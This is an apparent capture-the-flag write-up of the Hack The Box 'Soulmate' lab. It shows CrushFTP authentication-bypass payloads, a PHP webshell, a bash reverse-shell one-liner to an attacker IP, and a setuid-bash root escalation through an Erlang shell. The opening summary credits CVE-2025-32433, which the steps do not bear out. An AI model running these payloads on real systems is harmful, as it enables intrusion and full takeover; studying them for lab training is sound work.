---
title: "HTB: Soulmate"
# description: ""
date: "2026-02-15 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [ffuf,crushftp,cve-2025-31161,cve-2025-54309,php-webshell,erlang-ssh,setuid,bash-copy]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/soulmate.png

---
**Soulmate is an easy Linux box. Exploit CVE-2025-31161 (CrushFTP auth bypass) to access an admin account, then upload a malicious PHP file for RCE. Escalate to root via CVE-2025-32433 (Erlang/OTP SSH server RCE).**


---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
$ sudo nmap -sC -sV 10.129.231.23
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-12 17:37 UTC
Nmap scan report for 0xdf.gitlab.htb (10.129.231.23)
Host is up (1.8s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.91 seconds
```

### <span style="color:lightgreen">Subdomain Fuzz</span>
use `ffuf` to scan for any subdomains of `soulmate.htb`:

```console
$ ffuf -u http://10.129.231.23 -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/subdomains-top1million-20000.txt -ac
..snip..
ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 150ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1851 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```
It finds `ftp.soulmate.htb`. I’ll add it and `soulmate.htb` to hosts file:
```console
$ sudo vi /etc/hosts
10.129.231.23 soulmate.htb ftp.soulmate.htb
```
### <span style="color:lightgreen">Look at website - http 80</span>

The website is a dating website, and the various pages on the site are all `.php`:

![Desktop View](assets/md_images/site1-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }


I can find an email address `hello@soulmate.htb` and login and registration links. After register & login account, leads to a profile page. Letʼs look at `ftp.soulmate.htb`
#### Directory Brute Force
Run `gobuster` against the site with `-x` php since the site is PHP-based — but no new results beyond what was already known:
```console
$ gobuster dir -u http://10.129.231.23 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php
..snip..
/assets               (Status: 301) [Size: 178] [--> http://soulmate.htb/assets/]
/dashboard.php        (Status: 302) [Size: 0] [--> /login]
/index.php            (Status: 200) [Size: 16688]
/login.php            (Status: 200) [Size: 8554]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/profile.php          (Status: 302) [Size: 0] [--> /login]
/register.php         (Status: 200) [Size: 11107]
```

### <span style="color:lightgreen">Look at website - ftp.soulmate.htb</span>
This site is an instance of `CrushFTP`:
![Desktop View](assets/md_images/site2-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }

Looking at the source code, we can identify the CrushFTP release version and date from the`?v=11.W.657-2025_03_08_07_52`parameter:

![Desktop View](assets/md_images/site3-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }


After searching, we find two auth bypass CVEs affecting this version:`CVE-2025-31161`and `CVE-2025-54309`. We will try both.

## <span style="color:lightblue">Foothold</span>
### <span style="color:lightgreen">CVE-2025-31161</span>
We can use [this poc](https://github.com/Immersive-Labs-Sec/CVE-2025-31161) from Immersive Security:
```console
$ git clone https://github.com/Immersive-Labs-Sec/CVE-2025-31161
$ cd CVE-2025-31161/

$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80                                         
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: AuthBypassAccount
   [*] Password: CorrectHorseBatteryStaple.
```
We can now log in to CrushFTP using the credentials provided by the PoC.

#### why?
The script sends two requests with crafted headers. 
```console
headers = {
        "Cookie": "currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If",
        "Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/",
        "Connection": "close",
        "User-Agent": random.choice(USER_AGENTS),
    }
```
CrushFTP reads the `Authorization` header and begins an AWS S3 auth flow, extracting the username from the `Credential` field — but never fully validates it, leaving the session partially authenticated with admin access.
First, a `GET` request to `/WebInterface/function/` establishes the session.
Then, a `POST` to the same endpoint with a setUserItem command creates a new user via an XML payload.
```console
payload = {
        "command": "setUserItem",
        "data_action": "replace",
        "serverGroup": "MainUsers",
        "username": new_user,
        "user": f'<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>{new_user}</user_name><password>{password}</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>{target_user}</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>',
        "xmlItem": "user",
        "vfs_items": '<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>',
        "permissions": '<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>',
        "c2f": "31If"
    }
```
The key detail is that the `c2f` field in both the cookie and payload must match the last four characters of the CrushAuth cookie, bypassing the CSRF check.

### <span style="color:lightgreen">CVE-2025-54309</span>
We can use [this poc](https://github.com/whisperer1290/CVE-2025-54309__Enhanced_exploit) from whisperer1290:
```console
$ git clone https://github.com/whisperer1290/CVE-2025-54309__Enhanced_exploit.git
$ cd CVE-2025-54309__Enhanced_exploit/

$ python3 exploit.py http://ftp.soulmate.htb -u testadmin -p password123

╔═══════════════════════════════════════════════════════════╗
║            CrushFTP CVE-2025-54309 Exploit               ║
║         Race Condition Authentication Bypass             ║
║               User Creation Version                       ║
║                                                           ║
║           FOR AUTHORIZED TESTING ONLY                     ║
║              HTB Labs & Pentesting Use                    ║
╚═══════════════════════════════════════════════════════════╝

[*] Target: http://ftp.soulmate.htb
[*] New admin user: testadmin:password123
[*] CRUSHFTP USER CREATION EXPLOIT
[*] TARGET: http://ftp.soulmate.htb
[*] CREATING USER: testadmin:password123
[*] ATTACK: 5000 requests with new c2f every 50 requests
============================================================
[*] Generated new c2f value: QfRU
[*] Starting race with 5000 request pairs...
============================================================
[*] Generated new c2f value: lxZ7
[*] NEW SESSION: c2f=lxZ7
[+] SUCCESS! User 'testadmin' created successfully!
[+] Response indicates user creation was successful
[+] USER CREATION SUCCESSFUL!
[*] Verifying user creation...
[-] VERIFICATION FAILED: User 'testadmin' not found in user list

[+] EXPLOITATION COMPLETE!
[+] Admin user created: testadmin:password123
[+] Try logging in at: http://ftp.soulmate.htb/WebInterface/
[+] Or access the admin interface directly
```
We can now log in to CrushFTP using the credentials provided by the PoC.

#### why?
This exploit abuses a race condition in how the `AS2-TO` header is handled. The script fires two requests in parallel:
1. AS2 request — sends a `POST` with `AS2-TO: \crushadmin`, temporarily authenticating the session as `crushadmin`.
2. Regular request — sends a user-creation `POST` sharing the same `CrushAuth` session cookie. If processed before the session is invalidated, it successfully creates a new admin user.

The script attempts up to 5000 request pairs until it succeeds.

## <span style="color:lightblue">Shell as www-data</span>
After logging in, navigate to`Admin`and click`User Manager`link at the top. Click your user and add a folder with `Upload` privileges. After some exploration, the dating website source is found at `/app/webProd` — drag it over to grant access:

![Desktop View](assets/md_images/site4-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }

### <span style="color:lightgreen">Webshell - php</span>
After clicking `Save` and returning to Files, the `soulmate.htb` site files are visible. Now create a simple PHP webshell:
```php
<?php system($_REQUEST['cmd']); ?>
```

Upload it as `cmd.php`:

![Desktop View](assets/md_images/site5-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }

Access the webshell via `http://soulmate.htb/cmd.php?cmd=id`, using the`?cmd=`parameter to execute system commands.

![Desktop View](assets/md_images/id-soulmate.png){: .w-75 .rounded-10 w='1212' h='668' }

To get a reverse shell, URL-encode the payload — you can use Burp's `Ctrl+U` to encode it, or just paste the below into the browser.
```
http://soulmate.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.144/9001+0>%261'
```
Get webshell:
```console
$ rlwrap nc -lvnp 9001                                                                                                                                   
listening on [any] 9001 ...                                                                                                                                
Connection received on 10.129.231.23 34824
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:~/soulmate.htb/public$
```
Upgrade the shell `python3 -c 'import pty;pty.spawn("/bin/bash")'` or `script /dev/null -c bash`:
```console
www-data@soulmate:~/soulmate.htb/public$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:~/soulmate.htb/public$ ^Z
zsh: suspended   nc -lnvp 9001
$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001
www-data@soulmate:~/soulmate.htb/public$ export XTERM=xterm
```

## <span style="color:lightblue">Shell as ben</span>
### <span style="color:lightgreen">Enumeration</span>
#### Website source code
First, check the website source code located at`/var/www/soulmate.htb`:
```console
www-data@soulmate:~/soulmate.htb$ ls
config  data  public  src
```
We can find the `/data` has a SQLite database:
```console
www-data@soulmate:~/soulmate.htb/data$ file soulmate.db 
data/soulmate.db: SQLite 3.x database
```
Dump the SQLite database — it contains a single hash, passing it to `hashcat` but it doesn’t crack..
```console
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            name TEXT,
            bio TEXT,
            interests TEXT,
            phone TEXT,
            profile_pic TEXT,
            last_login DATETIME,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        );
INSERT INTO users VALUES(1,'admin','$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2',1,'Administrator',NULL,NULL,NULL,NULL,'2025-08-10 13:00:08','2025-08-10 12:59:39');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('users',2);
COMMIT;
```
#### Process
Looking at the process list, there’s an interesting entry:
```console
www-data@soulmate:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                                            
root           1  0.0  0.2 166164 11432 ?        Ss   Feb12   0:05 /sbin/init  
..snip..
root        1144  0.0  1.6 2252184 67372 ?       Ssl  Feb12   0:29 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
..snip..
```
This is an Erlang script. We can find the password for user `ben` in `start.escript`:
```console
www-data@soulmate:/$ ls -l /usr/local/lib/erlang_login/start.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 /usr/local/lib/erlang_login/start.escript

www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript 
#!/usr/bin/env escript
%%! -sname ssh_runner
..snip..
    io:format("Starting SSH daemon with logging...~n"),
    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},
..snip..
        {auth_methods, "publickey,password"},
        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
..snip..
```
and the user `ben` has the following shell set:
```console
www-data@soulmate:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```
### <span style="color:lightgreen">SSH in ben</span>
We can ssh in `ben` and get user flag:
```console
$ ssh ben@soulmate.htb
Warning: Permanently added 'soulmate.htb' (ED25519) to the list of known hosts.
Last login: Fri Feb 13 01:50:52 2026 from 10.10.14.44
ben@soulmate:~$ cat user.txt
e74a6139************************
```

## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">Enumeration</span>
`ben` cannot run `sudo` and home directory is empty:
```console
ben@soulmate:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on soulmate.
Their home directory is very empty:

ben@soulmate:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Sep  2 10:27 .
drwxr-xr-x 3 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx 1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r-- 1 ben  ben   220 Aug  6  2025 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug  6  2025 .bashrc
drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
-rw-r--r-- 1 ben  ben   807 Aug  6  2025 .profile
-rw-r----- 1 root ben    33 Feb 12 12:52 user.txt
```

### <span style="color:lightgreen">Erlang SSH daemon</span>
As noted above, the Erlang script runs as root. The content describes starting an SSH daemon on port 2222. Given all of this, I can connect as `ben` using the same password `HouseH0ldings998`:
```console
ben@soulmate:~$ ssh -p 2222 ben@localhost
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1>
```

Call `help().` to list available functions. Since the daemon runs as`root`, any commands executed will execute as`root`.

```console
(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
..snip..
ls()       -- list files in the current directory
ls(Dir)    -- list files in directory <Dir>
m()        -- which modules are loaded
m(Mod)     -- information about module <Mod>
mm()       -- list all modified modules
memory()   -- memory allocation information
memory(T)  -- memory allocation information of type <T>
nc(File)   -- compile and load code in <File> on all nodes
nl(Module) -- load module on all nodes
pid(X,Y,Z) -- convert X,Y,Z to a Pid
pwd()      -- print working directory
..snip..
```
#### Exploit 
Nothing obvious for running OS commands, but using `m()` to list loaded modules reveals `os` is available.

```console
(ssh_runner@soulmate)1> m().
..snip..
ordsets   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/ordsets.beam
os        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
otp_internal   /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/otp_internal.beam
peer    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/peer.beam
..snip..
```

Type `os` followed by `Tab` to see the available autocomplete suggestions.
```console
modules
os:   os_mon:   os_mon_mib:   os_mon_sysinfo:   os_sup:
(ssh_runner@soulmate)1> os
```

And type `os:` followed by `Tab` to see the available options.

```console
functions
| cmd(        env(                        find_executable(         getenv( 
| getpid(     internal_init_cmd_shell(    module_info(             perf_counter( 
| putenv(     set_signal(                 system_time(             timestamp(
| type(       unsetenv(                   version( 
(ssh_runner@soulmate)1> os:
```

Use `os:cmd('somecmd').` to execute OS commands.
```console
(ssh_runner@soulmate)11> os:cmd('id').
"uid=0(root) gid=0(root) groups=0(root)\n"
```

### <span style="color:lightgreen">SetUID/SetGID bash copy</span>

To get a root shell, create a `SetUID/SetGID` copy of `bash`:
```console
(ssh_runner@soulmate)12> os:cmd('cp /bin/bash /tmp/woot').
[]
(ssh_runner@soulmate)13> os:cmd('chmod 6777 /tmp/woot').
[]
```

From a shell as `ben`, run the copied bash with `-p` to retain elevated privileges.
```console
ben@soulmate:~$ /tmp/woot -p
woot-5.1#  cat /root/root.txt 
d39f86c21************************
```


